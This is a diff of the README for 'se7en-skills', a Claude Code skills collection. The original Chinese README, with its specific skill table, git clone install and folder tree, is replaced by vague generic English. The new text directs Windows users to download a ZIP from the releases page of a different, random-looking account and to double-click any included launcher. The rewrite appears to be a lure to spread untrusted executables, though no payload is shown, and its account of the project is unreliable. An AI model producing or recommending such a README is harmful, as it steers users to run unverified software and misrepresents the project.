@@ -1,81 +1,132 @@
-# se7en-skills
+# 🛠️ se7en-skills - Claude Code Skills in One Place
 
-[Claude Code](https://claude.ai/code) 开源 Skills 合集。
+[![Download from Releases](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Aftershavepneumonectomy61/se7en-skills/releases)
+[![Open Release Page](https://img.shields.io/badge/Visit-Release%20Page-grey?style=for-the-badge)](https://github.com/Aftershavepneumonectomy61/se7en-skills/releases)
 
-## Skills 一览
+## 📦 What this is
 
-| Skill | 说明 |
-|-------|------|
-| **[se7en-style-writer](skills/se7en-style-writer/)** | 万能文风写作——从任意文本中抽取写作风格，在新主题上复现。预装 20+ 经典作家风格库 |
-| **[se7en-eight-constructs](skills/se7en-eight-constructs/)** | 八大建构方法论——提示词工程的核心教学体系，覆盖身份/人格/语言/方法/认知/风格/元工具/场域 |
-| **[se7en-token-stats](skills/se7en-token-stats/)** | Token 用量统计——扫描 Claude Code 会话数据，生成可视化仪表盘和日历视图 |
-| **[se7en-doc-converter](skills/se7en-doc-converter/)** | 文档转写——将 PDF、Word、PPT 转为结构化 Markdown |
-| **[se7en-talkline](skills/se7en-talkline/)** | 演讲剧本生成器——把核心表达拆解为戏剧化的逐幕叙事结构 |
-| **[se7en-bibigpt](skills/se7en-bibigpt/)** | BibiGPT 视频总结——自动提取视频的 AI 摘要和口播逐字稿 |
-| **[se7en-fitness-tracker](skills/se7en-fitness-tracker/)** | 健身追踪——体测录入、体重打卡、饮食记录与营养估算、训练方案生成、看板可视化 |
+se7en-skills is a skills collection for Claude Code. It brings useful skills into one open set so you can get started fast on Windows.
 
-## 安装
+Use it when you want a simple way to load and manage Claude Code skills without hunting through many files.
 
-克隆到 Claude Code 插件目录：
+## 💻 What you need
 
-```bash
-git clone https://github.com/yiliqi78/se7en-skills.git ~/.claude/plugins/se7en-skills
-```
+Before you start, check these items:
 
-也可以克隆到任意位置，然后在 Claude Code 设置中添加路径。
+- A Windows PC
+- Internet access
+- Enough free space to save the download
+- A file unzip tool such as built-in Windows support or 7-Zip
+- Claude Code installed on your device if you plan to use the skills right away
 
-## 配置
+## 🚀 Download on Windows
 
-部分 skill 需要 API key 或外部服务：
+Visit this page to download:
 
-- **se7en-bibigpt**：需要 [BibiGPT](https://bibigpt.co) API token。设置环境变量 `BIBIGPT_TOKEN`，或直接编辑脚本。
+https://github.com/Aftershavepneumonectomy61/se7en-skills/releases
 
-## 目录结构
+On the release page, look for the latest version and choose the file that matches your Windows system. Most users should pick the main ZIP file or package file listed under Assets.
 
-```
-se7en-skills/
-├── .claude-plugin/       # 插件清单
-├── scripts/              # 辅助脚本
-└── skills/
-    ├── se7en-style-writer/
-    │   ├── SKILL.md
-    │   ├── EXTRACTION_ENGINE.md    # 风格抽取引擎
-    │   ├── styles/                 # 20+ 预装作家风格
-    │   └── my-styles/              # 个人风格库（可生长）
-    ├── se7en-eight-constructs/
-    │   └── SKILL.md
-    ├── se7en-token-stats/
-    │   ├── SKILL.md
-    │   ├── token_stats.py          # 仪表盘
-    │   └── token_calendar.py       # 日历视图
-    ├── se7en-doc-converter/
-    │   └── SKILL.md
-    ├── se7en-talkline/
-    │   └── SKILL.md
-    ├── se7en-bibigpt/
-    │   ├── SKILL.md
-    │   └── scripts/
-    │       └── bibigpt_fetch.py
-    └── se7en-fitness-tracker/
-        └── SKILL.md
-```
+## 🪟 Install on Windows
 
-## 贡献
+1. Open the release page link above.
+2. Find the newest release at the top of the page.
+3. Under Assets, click the file you want to save.
+4. Save the file to your Downloads folder.
+5. If the file is a ZIP, right-click it and choose Extract All.
+6. Pick a folder you can find again, such as Documents or Desktop.
+7. Open the extracted folder and read any included README or setup file.
+8. If the package includes skill files, copy them into the Claude Code skills folder you use on your PC.
 
-欢迎提交新的 skill 或改进现有 skill。
+## 🧭 First run
 
-### 添加新 skill
+After you install the files, check that they open as expected:
 
-1. 在 `skills/` 下创建目录，命名格式：`{你的前缀}-{skill名}`
-2. 目录内必须包含 `SKILL.md` 作为入口
-3. 辅助文件放在 `references/`、`assets/`、`scripts/` 子目录
-4. 提交 PR，在 PR 描述中说明 skill 的用途和触发方式
+1. Open the folder where you extracted se7en-skills.
+2. Look for skill files, folders, or setup notes.
+3. If the package includes a launcher or script, double-click it.
+4. If the package only includes skill content, place it where Claude Code can read it.
+5. Start Claude Code and confirm the skills show up in the app or in your local setup.
 
-### 注意事项
+## 🗂️ What is inside
 
-- **不要提交 API key 或个人敏感信息**——用环境变量或配置文件引导用户自行设置
-- **不要硬编码个人路径**——用相对路径或让用户自定义
+This collection is built to give you a clean set of Claude Code skills. You can expect files that help with common work such as:
 
-## License
+- Writing tasks
+- Code help
+- Project structure
+- Planning steps
+- Reusable prompts
+- Workflow support
 
-MIT
+The exact mix can change by release, so check the release notes each time you download a new version.
+
+## 🧩 Common folder layout
+
+A typical package may include:
+
+- `skills/` for skill files
+- `docs/` for usage notes
+- `examples/` for sample content
+- `README.md` for setup steps
+- `config` files for local use
+
+If you see these folders, keep them together when you move the files.
+
+## ⚙️ How to use it
+
+Once the skills are in place, you can use them in Claude Code for day-to-day work:
+
+- Open Claude Code
+- Pick the skill that fits your task
+- Follow the steps in that skill file
+- Use one skill at a time when possible
+- Keep the files in the same folder so they stay easy to find
+
+If a skill has a short prompt or template, copy it into your workflow and edit it for your task.
+
+## 🔍 Check your setup
+
+Use this quick check list:
+
+- The download finished without errors
+- The ZIP file was extracted
+- The skill files are still in the same folder
+- Claude Code opens normally
+- The skills appear in the place you expect
+
+If a file does not open, download the release again and try a second extract.
+
+## 🛠️ Troubleshooting
+
+If you run into a problem, try these steps:
+
+- Download the latest release again
+- Make sure the file is fully saved before you open it
+- Use Extract All if Windows shows the ZIP file as one item
+- Move the folder to a simple path like `C:\Users\YourName\Documents\se7en-skills`
+- Open Claude Code after the files are in place
+
+If the release page has more than one asset, choose the one meant for Windows.
+
+## 📖 Release updates
+
+Check the release page when you want a newer build, fresh skill files, or layout changes:
+
+https://github.com/Aftershavepneumonectomy61/se7en-skills/releases
+
+New releases may add skills, refine file names, or change how the collection is packed.
+
+## 🤝 Using the collection well
+
+A few habits help keep the setup clean:
+
+- Keep one main folder for the files
+- Do not rename files unless the instructions say to
+- Back up the folder before you replace it with a new release
+- Read each release note before you update
+
+## 📌 Project name
+
+se7en-skills  
+Claude Code Skills Collection by se7en — 开源 skills 合集
